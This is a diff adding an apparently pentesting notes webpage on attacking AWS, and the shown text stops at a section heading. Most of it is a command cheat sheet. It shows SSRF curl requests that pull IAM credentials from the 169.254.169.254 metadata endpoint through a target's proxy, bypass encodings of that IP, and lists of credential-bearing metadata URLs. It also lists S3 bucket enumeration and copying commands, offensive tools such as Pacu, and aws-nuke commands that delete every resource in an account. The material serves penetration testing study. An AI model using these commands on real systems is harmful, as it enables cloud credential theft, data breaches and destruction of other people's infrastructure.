@@ -1,0 +1,1011 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>AWS - Checklist</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../index.html">Introduction</a></li><li class="chapter-item expanded "><a href="../../foodprinting_and_reconnaissances.html"><strong aria-hidden="true">1.</strong> Foodprinting and Reconnaissances</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Checklist</li><li class="chapter-item expanded "><a href="../../Checklist/Web-App-Pentest-Checklist.html"><strong aria-hidden="true">2.</strong> Web Application</a></li><li class="chapter-item expanded "><a href="../../Checklist/report_writing.html"><strong aria-hidden="true">3.</strong> Report Writing</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Recon</li><li class="chapter-item expanded "><a href="../../recon/public-info-gathering.html"><strong aria-hidden="true">4.</strong> Public info gathering</a></li><li class="chapter-item expanded "><a href="../../recon/domain-enum.html"><strong aria-hidden="true">5.</strong> Root domains</a></li><li class="chapter-item expanded "><a href="../../recon/subdomain-enum/index.html"><strong aria-hidden="true">6.</strong> Subdomain Enum</a></li><li class="chapter-item expanded "><a href="../../recon/subdomain-enum/subdomain-takeover.html"><strong aria-hidden="true">7.</strong> Subdomain Takeover</a></li><li class="chapter-item expanded "><a href="../../recon/webs-recon.html"><strong aria-hidden="true">8.</strong> Webs recon</a></li><li class="chapter-item expanded "><a href="../../recon/network-scanning.html"><strong aria-hidden="true">9.</strong> Network Scanning</a></li><li class="chapter-item expanded "><a href="../../recon/host-scanning.html"><strong aria-hidden="true">10.</strong> Host Scanning</a></li><li class="chapter-item expanded "><a href="../../recon/packet-scanning.html"><strong aria-hidden="true">11.</strong> Packet Scanning</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Enumeration</li><li class="chapter-item expanded "><a href="../../enumeration/files.html"><strong aria-hidden="true">12.</strong> Files</a></li><li class="chapter-item expanded "><a href="../../enumeration/ssl-tls.html"><strong aria-hidden="true">13.</strong> SSL/TLS</a></li><li class="chapter-item expanded "><a href="../../enumeration/ports.html"><strong aria-hidden="true">14.</strong> Ports</a></li><li class="chapter-item expanded affix "><li class="part-title">Web</li><li class="chapter-item expanded "><a href="../../enumeration/web/index.html"><strong aria-hidden="true">15.</strong> Web Attacks</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/general-info.html"><strong aria-hidden="true">16.</strong> General Info</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/quick-tricks.html"><strong aria-hidden="true">17.</strong> Quick tricks</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/header-injections.html"><strong aria-hidden="true">18.</strong> Header injections</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/bruteforcing.html"><strong aria-hidden="true">19.</strong> Bruteforcing</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/online-hashes-cracked.html"><strong aria-hidden="true">20.</strong> Online hashes cracked</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/crawl-fuzz.html"><strong aria-hidden="true">21.</strong> Crawl/Fuzz</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/lfi-rfi.html"><strong aria-hidden="true">22.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/upload-bypasses.html"><strong aria-hidden="true">23.</strong> File upload</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/sqli.html"><strong aria-hidden="true">24.</strong> SQLi</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/ssrf.html"><strong aria-hidden="true">25.</strong> SSRF</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/open-redirects.html"><strong aria-hidden="true">26.</strong> Open redirects</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/xss.html"><strong aria-hidden="true">27.</strong> XSS</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/csp.html"><strong aria-hidden="true">28.</strong> CSP</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/xxe.html"><strong aria-hidden="true">29.</strong> XXE</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/cookie-padding.html"><strong aria-hidden="true">30.</strong> Cookie Padding</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/web-shells.html"><strong aria-hidden="true">31.</strong> Webshells</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/cors.html"><strong aria-hidden="true">32.</strong> CORS</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/csrf.html"><strong aria-hidden="true">33.</strong> CSRF</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/web-cache-poisoning.html"><strong aria-hidden="true">34.</strong> Web Cache Poisoning</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/broken-links.html"><strong aria-hidden="true">35.</strong> Broken Links</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/clickjacking.html"><strong aria-hidden="true">36.</strong> Clickjacking</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/request-smuggling.html"><strong aria-hidden="true">37.</strong> HTTP Request Smuggling</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/web-sockets.html"><strong aria-hidden="true">38.</strong> Web Sockets</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/crlf.html"><strong aria-hidden="true">39.</strong> CRLF</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/idor.html"><strong aria-hidden="true">40.</strong> IDOR</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/web-cache-deception.html"><strong aria-hidden="true">41.</strong> Web Cache Deception</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/session-fixation.html"><strong aria-hidden="true">42.</strong> Session fixation</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/email-attacks.html"><strong aria-hidden="true">43.</strong> Email attacks</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/pastejacking.html"><strong aria-hidden="true">44.</strong> Pastejacking</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/parameter-pollution.html"><strong aria-hidden="true">45.</strong> HTTP Parameter pollution</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/ssti.html"><strong aria-hidden="true">46.</strong> SSTI</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/prototype-pollution.html"><strong aria-hidden="true">47.</strong> Prototype Pollution</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/command-injection.html"><strong aria-hidden="true">48.</strong> Command Injection</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/deserialization.html"><strong aria-hidden="true">49.</strong> Deserialization</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/dns-rebinding.html"><strong aria-hidden="true">50.</strong> DNS rebinding</a></li><li class="chapter-item expanded affix "><li class="part-title">Web-Service</li><li class="chapter-item expanded "><a href="../../enumeration/webservices/index.html"><strong aria-hidden="true">51.</strong> Web Technologies</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/apis.html"><strong aria-hidden="true">52.</strong> APIs</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/js.html"><strong aria-hidden="true">53.</strong> JS</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/.net.html"><strong aria-hidden="true">54.</strong> ASP.NET</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/jwt.html"><strong aria-hidden="true">55.</strong> JWT</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/github.html"><strong aria-hidden="true">56.</strong> GitHub</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/gitlab.html"><strong aria-hidden="true">57.</strong> GitLab</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/wafs.html"><strong aria-hidden="true">58.</strong> WAFs</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/firebird.html"><strong aria-hidden="true">59.</strong> Firebird</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/wordpress.html"><strong aria-hidden="true">60.</strong> Wordpress</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/webdav.html"><strong aria-hidden="true">61.</strong> WebDav</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/joomla.html"><strong aria-hidden="true">62.</strong> Joomla</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/jenkins.html"><strong aria-hidden="true">63.</strong> Jenkins</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/iis.html"><strong aria-hidden="true">64.</strong> IIS</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/vhosts.html"><strong aria-hidden="true">65.</strong> VHosts</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/firebase.html"><strong aria-hidden="true">66.</strong> Firebase</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/owa.html"><strong aria-hidden="true">67.</strong> OWA</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/oauth.html"><strong aria-hidden="true">68.</strong> OAuth</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/flask.html"><strong aria-hidden="true">69.</strong> Flask</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/symfony-and-and-twig.html"><strong aria-hidden="true">70.</strong> Symfony && Twig</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/drupal.html"><strong aria-hidden="true">71.</strong> Drupal</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/nosql-and-and-mongodb.html"><strong aria-hidden="true">72.</strong> NoSQL (MongoDB, CouchDB)</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/php.html"><strong aria-hidden="true">73.</strong> PHP</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/ror-ruby-on-rails.html"><strong aria-hidden="true">74.</strong> RoR (Ruby on Rails)</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/jboss-java-deserialization.html"><strong aria-hidden="true">75.</strong> JBoss - Java Deserialization</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/onelogin-saml-login.html"><strong aria-hidden="true">76.</strong> OneLogin - SAML Login</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/flash-swf.html"><strong aria-hidden="true">77.</strong> Flash SWF</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/nginx.html"><strong aria-hidden="true">78.</strong> Nginx</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/python.html"><strong aria-hidden="true">79.</strong> Python</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/tomcat.html"><strong aria-hidden="true">80.</strong> Tomcat</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/adobe-aem.html"><strong aria-hidden="true">81.</strong> Adobe AEM</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/magento.html"><strong aria-hidden="true">82.</strong> Magento</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/sap.html"><strong aria-hidden="true">83.</strong> SAP</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/mfa.html"><strong aria-hidden="true">84.</strong> MFA</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/gwt.html"><strong aria-hidden="true">85.</strong> GWT</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/jira.html"><strong aria-hidden="true">86.</strong> Jira</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/oidc-open-id-connect.html"><strong aria-hidden="true">87.</strong> OIDC (Open ID Connect)</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/elk.html"><strong aria-hidden="true">88.</strong> ELK</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/sharepoint.html"><strong aria-hidden="true">89.</strong> Sharepoint</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/others.html"><strong aria-hidden="true">90.</strong> Others</a></li><li class="chapter-item expanded affix "><li class="part-title">Cloud</li><li class="chapter-item expanded "><a href="../../enumeration/cloud/index.html"><strong aria-hidden="true">91.</strong> Cloud</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/general.html"><strong aria-hidden="true">92.</strong> General</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/cloud-info-recon.html"><strong aria-hidden="true">93.</strong> Cloud Info Gathering</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/aws.html" class="active"><strong aria-hidden="true">94.</strong> AWS</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/azure.html"><strong aria-hidden="true">95.</strong> Azure</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/gcp.html"><strong aria-hidden="true">96.</strong> GCP</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/docker-and-and-kubernetes.html"><strong aria-hidden="true">97.</strong> Docker && Kubernetes</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/cdn-comain-fronting.html"><strong aria-hidden="true">98.</strong> CDN - Comain Fronting</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Exploitation</li><li class="chapter-item expanded "><a href="../../exploitation/payloads.html"><strong aria-hidden="true">99.</strong> Payloads</a></li><li class="chapter-item expanded "><a href="../../exploitation/reverse-shells.html"><strong aria-hidden="true">100.</strong> Reverse Shells</a></li><li class="chapter-item expanded "><a href="../../exploitation/file-transfer.html"><strong aria-hidden="true">101.</strong> File transfer</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Post-Exploitation</li><li class="chapter-item expanded "><a href="../../post-exploitation/linux.html"><strong aria-hidden="true">102.</strong> Linux</a></li><li class="chapter-item expanded "><a href="../../post-exploitation/pivoting.html"><strong aria-hidden="true">103.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="../../post-exploitation/windows/index.html"><strong aria-hidden="true">104.</strong> Windows</a></li><li class="chapter-item expanded "><a href="../../post-exploitation/windows/ad/index.html"><strong aria-hidden="true">105.</strong> AD</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../post-exploitation/windows/ad/kerberos-attacks.html"><strong aria-hidden="true">105.1.</strong> Kerberos</a></li></ol></li><li class="chapter-item expanded "><a href="../../post-exploitation/windows/ps-tips-and-tricks.html"><strong aria-hidden="true">106.</strong> PS tips & tricks</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Mobile</li><li class="chapter-item expanded "><a href="../../mobile/general.html"><strong aria-hidden="true">107.</strong> General</a></li><li class="chapter-item expanded "><a href="../../mobile/android.html"><strong aria-hidden="true">108.</strong> Android</a></li><li class="chapter-item expanded "><a href="../../mobile/ios.html"><strong aria-hidden="true">109.</strong> iOS</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Others</li><li class="chapter-item expanded "><a href="../../others/burp.html"><strong aria-hidden="true">110.</strong> Burp Suite</a></li><li class="chapter-item expanded "><a href="../../others/password-cracking.html"><strong aria-hidden="true">111.</strong> Password cracking</a></li><li class="chapter-item expanded "><a href="../../others/virtualbox.html"><strong aria-hidden="true">112.</strong> VirtualBox</a></li><li class="chapter-item expanded "><a href="../../others/code-review.html"><strong aria-hidden="true">113.</strong> Code review</a></li><li class="chapter-item expanded "><a href="../../others/web-checklist.html"><strong aria-hidden="true">114.</strong> Pentesting Web checklist</a></li><li class="chapter-item expanded "><a href="../../others/internal-pentest.html"><strong aria-hidden="true">115.</strong> Internal Pentest</a></li><li class="chapter-item expanded "><a href="../../others/web-fuzzers-comparision.html"><strong aria-hidden="true">116.</strong> Web fuzzers review</a></li><li class="chapter-item expanded "><a href="../../others/recon-suites-review.html"><strong aria-hidden="true">117.</strong> Recon suites review</a></li><li class="chapter-item expanded "><a href="../../others/subdomain-tools-review.html"><strong aria-hidden="true">118.</strong> Subdomain tools review</a></li><li class="chapter-item expanded "><a href="../../others/dictionaries.html"><strong aria-hidden="true">119.</strong> Random</a></li><li class="chapter-item expanded "><a href="../../others/master-assessment-mindmap.html"><strong aria-hidden="true">120.</strong> Master assessment mindmaps</a></li><li class="chapter-item expanded "><a href="../../others/bugbounty.html"><strong aria-hidden="true">121.</strong> BugBounty</a></li><li class="chapter-item expanded "><a href="../../others/exploiting.html"><strong aria-hidden="true">122.</strong> Exploiting</a></li><li class="chapter-item expanded "><a href="../../others/tools-everywhere.html"><strong aria-hidden="true">123.</strong> tools everywhere</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Checklist</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="aws"><a class="header" href="#aws">AWS</a></h1>
+<h2 id="aws-basic-info"><a class="header" href="#aws-basic-info">AWS basic info</a></h2>
+<pre><code>Auth methods:
+• Programmatic access - Access + Secret Key
+   ◇ Secret Access Key and Access Key ID for authenticating via scripts and CLI
+• Management Console Access
+   ◇ Web Portal Access to AWS
+
+AWS services lists by endpoint
+https://docs.aws.amazon.com/general/latest/gr/rande.html
+
+Recon:
+• AWS Usage
+   ◇ Some web applications may pull content directly from S3 buckets
+   ◇ Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
+   ◇ Burp Suite
+   ◇ Navigate application like you normally would and then check for any requests to:
+      ▪ https://[bucketname].s3.amazonaws.com
+      ▪ https://s3-[region].amazonaws.com/[OrgName]
+
+S3:
+• Amazon Simple Storage Service (S3)
+   ◇ Storage service that is “secure by default”
+   ◇ Configuration issues tend to unsecure buckets by making them publicly accessible
+   ◇ Nslookup can help reveal region
+   ◇ S3 URL Format:
+      ▪ https://[bucketname].s3.amazonaws.com
+      ▪ https://s3-[region].amazonaws.com/[Org Name]
+        # aws s3 ls s3://bucket-name-here --region 
+        # aws s3api get-bucket-acl --bucket bucket-name-here
+        # aws s3 cp readme.txt  s3://bucket-name-here --profile newuserprofile
+
+EBS Volumes:
+• Elastic Block Store (EBS)
+• AWS virtual hard disks
+• Can have similar issues to S3 being publicly available
+• Difficult to target specific org but can find widespread leaks
+
+EC2:
+• Like virtual machines
+• SSH keys created when started, RDP for Windows.
+• Security groups to handle open ports and allowed IPs.
+
+AWS Instance Metadata URL
+• Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
+• A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
+• Can contain access/secret keys to AWS and IAM credentials
+• This should only be reachable from the localhost
+• Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
+• IAM credentials can be stored here:
+   ◇ http://169.254.169.254/latest/meta-data/iam/security-credentials/
+• Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
+   ◇ curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ &amp;&amp; echo
+• CapitalOne Hack
+   ◇ Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
+• AWS EC2 Instance Metadata service Version 2 (IMDSv2)
+• Updated in November 2019 – Both v1 and v2 are available
+• Supposed to defend the metadata service against SSRF and reverse proxy vulns
+• Added session auth to requests
+• First, a “PUT” request is sent and then responded to with a token
+• Then, that token can be used to query data
+--
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
+curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
+--
+
+Post-compromise
+• What do our access keys give us access to?
+• Check AIO tools to do some recon (WeirdAAL- recon_module, PACU privesc,...)
+
+http://169.254.169.254/latest/meta-data
+http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;IAM Role Name&gt;
+
+# AWS nuke - remove all AWS services of our account
+# https://github.com/rebuy-de/aws-nuke
+- Fill nuke-config.yml with the output of aws sts get-caller-identity
+./aws-nuke -c nuke-config.yml # Checks what will be removed
+- If fails because there is no alias created
+aws iam create-account-alias --account-alias unique-name
+./aws-nuke -c nuke-config.yml --no-dry-run # Will perform delete operation
+
+# Cloud Nuke
+# https://github.com/gruntwork-io/cloud-nuke
+cloud-nuke aws
+
+# Other bypasses
+1.
+aws eks list-clusters | jq -rc '.clusters'
+["example"]
+aws eks update-kubeconfig --name example
+kubectl get secrets
+
+2. SSRF AWS Bypasses to access metadata endpoint.
+Converted Decimal IP: http://2852039166/latest/meta-data/
+IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
+IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
+
+# Interesting metadata instance urls:
+http://instance-data
+http://169.254.169.254
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+</code></pre>
+<h3 id="find-aws-in-domaincompany"><a class="header" href="#find-aws-in-domaincompany">Find AWS in domain/company</a></h3>
+<pre><code># Find subdomains
+
+./sub.sh -s example.com
+assetfinder example.com
+## Bruteforcing
+python3 dnsrecon.py -d example.com -D subdomains-top1mil-5000.txt -t brt
+
+# Reverse DNS lookups
+host subdomain.domain.com
+host IP
+
+# Bucket finders
+python3 cloud_enum.py -k example.com
+ruby lazys3.rb companyname
+# https://github.com/bbb31/slurp
+slurp domain -t example.com
+</code></pre>
+<h3 id="aio-aws-tools"><a class="header" href="#aio-aws-tools">AIO AWS tools</a></h3>
+<pre><code># https://github.com/carnal0wnage/weirdAAL
+pip3 install -r requirements
+cp env.sample .env
+vim .env
+python3 weirdAAL.py -l
+
+# https://github.com/RhinoSecurityLabs/pacu
+bash install.sh
+python3 pacu.py
+import_keys --all
+ls
+
+# https://github.com/dagrz/aws_pwn
+# Lot of scripts for different purposes, check github
+
+# IAM resources finder
+# https://github.com/BishopFox/smogcloud
+smogcloud
+
+# Red team scripts for AWS
+# https://github.com/elitest/Redboto
+
+# AWS Bloodhound
+# https://github.com/lyft/cartography
+
+# AWS Exploitation Framework
+# https://github.com/grines/scour
+</code></pre>
+<h2 id="s3"><a class="header" href="#s3">S3</a></h2>
+<h3 id="basic-commands"><a class="header" href="#basic-commands">Basic Commands</a></h3>
+<pre><code>aws s3 ls s3:// 
+aws s3api list-buckets
+aws s3 ls s3://bucket.com
+aws s3 ls --recursive s3://bucket.com
+aws s3 sync s3://bucketname s3-files-dir
+aws s3 cp s3://bucket-name/&lt;file&gt; &lt;destination&gt;
+aws s3 cp/mv test-file.txt s3://bucket-name
+aws s3 rm s3://bucket-name/test-file.txt
+aws s3api get-bucket-acl --bucket bucket-name # Check owner
+aws s3api head-object --bucket bucket-name --key file.txt # Check file metadata
+</code></pre>
+<h3 id="find-s3-buckets"><a class="header" href="#find-s3-buckets">Find S3 buckets</a></h3>
+<pre><code># Find buckets from keyword or company name
+# https://github.com/nahamsec/lazys3
+ruby lazys3.rb companyname
+
+# https://github.com/initstring/cloud_enum
+python3 cloud_enum.py -k companynameorkeyword
+
+# https://github.com/gwen001/s3-buckets-finder
+php s3-buckets-bruteforcer.php --bucket gwen001-test002
+
+# Public s3 buckets
+https://buckets.grayhatwarfare.com
+https://github.com/eth0izzle/bucket-stream
+
+# https://github.com/cr0hn/festin
+festin mydomain.com
+festin -f domains.txt 
+
+# Google dork
+site:.s3.amazonaws.com "Company"
+</code></pre>
+<h3 id="check-s3-buckets-perms-and-files"><a class="header" href="#check-s3-buckets-perms-and-files">Check S3 buckets perms and files</a></h3>
